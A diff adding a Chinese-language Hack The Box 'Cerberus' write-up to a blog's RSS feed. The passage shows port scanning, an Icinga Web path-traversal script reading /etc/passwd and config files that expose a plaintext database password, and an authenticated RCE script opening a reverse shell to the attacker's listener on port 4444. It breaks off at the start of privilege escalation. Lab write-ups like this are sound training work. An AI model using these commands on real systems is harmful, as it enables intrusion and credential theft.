@@ -5,8 +5,926 @@
         <description>Recent content in Posts on Welcome My Hack&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 03 Nov 2026 14:00:00 +0800</lastBuildDate>
+        <lastBuildDate>Wed, 04 Nov 2026 14:00:00 +0800</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB-Cerberus Writeup</title>
+            <link>http://localhost:1313/posts/htb-cerberus-writeup/</link>
+            <pubDate>Wed, 04 Nov 2026 14:00:00 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/htb-cerberus-writeup/</guid>
+            <description>&lt;h2 id=&#34;nmap-探索&#34;&gt;Nmap 探索&lt;/h2&gt;
+&lt;p&gt;使用 nmap 扫描存活的 tcp 端口，只有 8080。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali/Cerberus&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo nmap --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; -p- 10.129.232.100 -oA Nmap/ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.98 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-11-03 05:30 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.232.100
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.73s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65534&lt;/span&gt; filtered tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no-response&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT     STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8080/tcp open  http-proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 18.63 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;web-渗透&#34;&gt;Web 渗透&lt;/h2&gt;
+&lt;p&gt;访问 8080 端口，自动跳转至 icinga.cerberus.local，解析 DNS。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020261103150748.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali/Cerberus&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ tail -n &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.129.232.100 icinga.cerberus.local
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重新访问出现界面，十一和名为 icinga 的系统。&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="nmap-探索">Nmap 探索</h2>
+<p>使用 nmap 扫描存活的 tcp 端口，只有 8080。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.232.100 -oA Nmap/ports
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-11-03 05:30 -0500
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.232.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.73s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.63 seconds
+</span></span></code></pre></div><h2 id="web-渗透">Web 渗透</h2>
+<p>访问 8080 端口，自动跳转至 icinga.cerberus.local，解析 DNS。</p>
+<p><img src="Pasted%20image%2020261103150748.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.232.100 icinga.cerberus.local
+</span></span></code></pre></div><p>重新访问出现界面，十一和名为 icinga 的系统。</p>
+<p><img src="Pasted%20image%2020261103151113.png" alt=""></p>
+<p>用 searchsploit 搜索这个系统的公开漏洞，暴露出来了三个，其中两个是有价值的：一个是路径穿越，一个是认证后的代码执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit Icinga
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                        |  Path
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Icinga - cgi/config.c process_cgivars Function Off-by-One Read Remote Denial of Service                                               | cgi/dos/38882.txt
+</span></span><span style="display:flex;"><span>Icinga Web 2.10 - Arbitrary File Disclosure                                                                                           | php/webapps/51329.py
+</span></span><span style="display:flex;"><span>Icinga Web 2.10 - Authenticated Remote Code Execution                                                                                 | php/webapps/51586.py
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>将路径穿越的执行脚本拉取到工作目录。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit -m <span style="color:#ae81ff">51329</span>
+</span></span><span style="display:flex;"><span>  Exploit: Icinga Web 2.10 - Arbitrary File Disclosure
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/51329
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/php/webapps/51329.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2022-24716
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable
+</span></span><span style="display:flex;"><span>Copied to: /home/kali/Work/Kali/Cerberus/51329.py
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah
+</span></span><span style="display:flex;"><span>total 16K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552883</span> drwxrwxr-x  <span style="color:#ae81ff">3</span> kali kali 4.0K Nov  <span style="color:#ae81ff">3</span> 05:44 .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2759041</span> drwxrwxr-x <span style="color:#ae81ff">23</span> kali kali 4.0K Nov  <span style="color:#ae81ff">3</span> 05:29 ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3553025</span> -rwxr-xr-x  <span style="color:#ae81ff">1</span> kali kali 2.4K Nov  <span style="color:#ae81ff">3</span> 05:44 51329.py
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552816</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> kali kali 4.0K Nov  <span style="color:#ae81ff">3</span> 05:31 Nmap
+</span></span></code></pre></div><h3 id="路径穿越">路径穿越</h3>
+<p>用脚本查看 <code>/etc/passwd</code> 成功，但是没发现有价值的信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/passwd
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pollinate:x:105:1::/var/cache/pollinate:/bin/false
+</span></span><span style="display:flex;"><span>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>matthew:x:1000:1000:matthew:/home/matthew:/bin/bash
+</span></span><span style="display:flex;"><span>ntp:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sssd:x:109:115:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nagios:x:110:118::/var/lib/nagios:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>redis:x:111:119::/var/lib/redis:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>icingadb:x:999:999::/etc/icingadb:/sbin/nologin
+</span></span></code></pre></div><p>尝试查看 <code>/etc/shadow</code>，没有结果。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/shadow
+</span></span></code></pre></div><p>查看 <code>/etc/icingaweb2/authentication.ini</code> 文件，认证后端是 <code>db</code>，账号信息和 hash 都放在 MySQL 里，而不是本地文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/authentication.ini
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>icingaweb2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>backend <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;db&#34;</span>
+</span></span><span style="display:flex;"><span>resource <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;icingaweb2&#34;</span>
+</span></span></code></pre></div><p><code>matthew</code> 属于Administrator，权限是 <code>*</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/roles.ini
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Administrators<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;matthew&#34;</span>
+</span></span><span style="display:flex;"><span>permissions <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;*&#34;</span>
+</span></span><span style="display:flex;"><span>groups <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Administrators&#34;</span>
+</span></span><span style="display:flex;"><span>unrestricted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>
+</span></span></code></pre></div><p>继续查看 <code>/etc/icingaweb2/resources.ini</code>，发现明文密码 <code>IcingaWebPassword2023</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/resources.ini
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>icingaweb2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;db&#34;</span>
+</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mysql&#34;</span>
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>
+</span></span><span style="display:flex;"><span>dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;icingaweb2&#34;</span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;matthew&#34;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IcingaWebPassword2023&#34;</span>
+</span></span><span style="display:flex;"><span>use_ssl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
+</span></span></code></pre></div><p><code>config.ini</code> 没有暴露出来更多信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/config.ini
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>global<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>show_stacktraces <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>show_application_state_messages <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>config_backend <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;db&#34;</span>
+</span></span><span style="display:flex;"><span>config_resource <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;icingaweb2&#34;</span>
+</span></span><span style="display:flex;"><span>module_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/share/icingaweb2/modules/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>logging<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>log <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;syslog&#34;</span>
+</span></span><span style="display:flex;"><span>level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ERROR&#34;</span>
+</span></span><span style="display:flex;"><span>application <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;icingaweb2&#34;</span>
+</span></span><span style="display:flex;"><span>facility <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>themes<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>authentication<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>将收集到的凭据保存下来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus/Users<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat matthew
+</span></span><span style="display:flex;"><span>matthew:IcingaWebPassword2023
+</span></span></code></pre></div><p>登录得到 matthew。</p>
+<p><img src="Pasted%20image%2020261103153157.png" alt=""></p>
+<p>浏览发现这个账号是 Administrator。</p>
+<p><img src="Pasted%20image%2020261103153341.png" alt=""></p>
+<h3 id="代码执行">代码执行</h3>
+<p>将代码执行的恶意脚本拉取到本地，查看用法。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit -m <span style="color:#ae81ff">51586</span>
+</span></span><span style="display:flex;"><span>  Exploit: Icinga Web 2.10 - Authenticated Remote Code Execution
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/51586
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/php/webapps/51586.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2022-24715
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: Python script, Unicode text, UTF-8 text executable
+</span></span><span style="display:flex;"><span>Copied to: /home/kali/Work/Kali/Cerberus/51586.py
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51586.py -h
+</span></span><span style="display:flex;"><span>usage: 51586.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> -u URL -U USER -P PASSWORD -i IP -p PORT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Descripción de tu programa.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>options:
+</span></span><span style="display:flex;"><span>  -h, --help            show this help message and exit
+</span></span><span style="display:flex;"><span>  -u, --url URL         Insertar la URL http://ip_victima
+</span></span><span style="display:flex;"><span>  -U, --user USER       Insertar usuario -U user
+</span></span><span style="display:flex;"><span>  -P, --password PASSWORD
+</span></span><span style="display:flex;"><span>                        Insertar contraseña -P password
+</span></span><span style="display:flex;"><span>  -i, --ip IP           Insertar IP de atacante -i IP
+</span></span><span style="display:flex;"><span>  -p, --port PORT       Insertar puerto de atacante -p PORT
+</span></span></code></pre></div><p>根据用法给出命令，回连 Kali 的 4444 端口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 51586.py -u http://icinga.cerberus.local:8080 -U matthew -P IcingaWebPassword2023 -i 10.10.16.151 -p <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>Session successfully.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>File uploaded successfully.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>Eliminating evidence
+</span></span></code></pre></div><p>同时 Kali 监听 4444 端口，等待回连拿到 www-data 的 bash 环境。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvnp <span style="color:#ae81ff">4444</span>                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.151<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.232.100<span style="color:#f92672">]</span> <span style="color:#ae81ff">49858</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>628<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@icinga:/usr/share/icingaweb2/public$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><h2 id="提权至-root">提权至 root</h2>
+<p>看看本机在监听什么，3306 和 6379 都绑定在回环上，外部碰不到。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@icinga:/usr/share/icingaweb2/public$ ss -tlnp
+</span></span><span style="display:flex;"><span>ss -tlnp
+</span></span><span style="display:flex;"><span>State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>   127.0.0.53%lo:53        0.0.0.0:*          
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">80</span>         127.0.0.1:3306      0.0.0.0:*          
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">511</span>        127.0.0.1:6379      0.0.0.0:*          
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">511</span>            <span style="color:#f92672">[</span>::1<span style="color:#f92672">]</span>:6379         <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*          
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">511</span>                *:80              *:* 
+</span></span></code></pre></div><p>使用之前找到的 mysql 账号查询表。</p>
